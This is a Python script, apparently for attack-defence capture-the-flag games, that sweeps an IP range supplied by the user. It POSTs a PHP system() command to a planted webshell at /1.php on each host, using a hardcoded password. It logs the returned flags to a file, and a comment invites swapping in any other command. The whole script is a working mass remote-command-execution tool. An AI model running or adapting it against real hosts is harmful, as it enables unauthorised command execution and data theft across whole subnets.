#coding: utf-8
#author: Qilinge
#version:python-3.7.3
#此脚本适用于比赛环境预留有webshell的情况
import requests
#需安装requests库
muma='/1.php'
#木马路径
password='qilinge'
#木马密码
port=80
payload={password:'system(\'type flag*\');'}
#把 type flag* 换成要执行的命令
def request(url,payload):
    try:
        r=requests.post(url,payload,timeout=1)
        if r.status_code==requests.codes.ok:
            f=open('webshell_flag.txt','a')
            f.write(ip+"  flag is : "+r.text+ "\n")
            f.close()
            print(url+" success! flag is: "+r.text)
        else:
            print(url+" 密码错误或文件不存在！")
    except:
        print(url+" 访问不到主机！！！")

xunhuan=int(input("循环的地址是第几段？(3 or 4)"))
if xunhuan==3:
    ip1=str(input("请输入第一段IP："))
    ip2=str(input("请输入第二段IP："))
    ip4=str(input("请输入第四段IP："))
    for ip3 in range(0,255):
        #range范围内自定义第三段IP范围，根据情况自己调，范围越小效率越高
        ip = str(ip1)+"."+str(ip2)+"."+str(ip3)+"."+str(ip4)
        url=str("http://"+ip + muma)
        request(url,payload)
    print("打开webshell_flag.txt查看flag！！！")
else:
    ip1=str(input("请输入第一段IP："))
    ip2=str(input("请输入第二段IP："))
    ip3=str(input("请输入第三段IP："))
    for ip4 in range(1,255):
        #range范围内自定义第四段IP范围，根据情况自己调，范围越小效率越高
        ip = str(ip1)+"."+str(ip2)+"."+str(ip3)+"."+str(ip4)
        url=str("http://"+ip + muma)
        request(url,payload)
    print("打开webshell_flag.txt查看flag！！！")
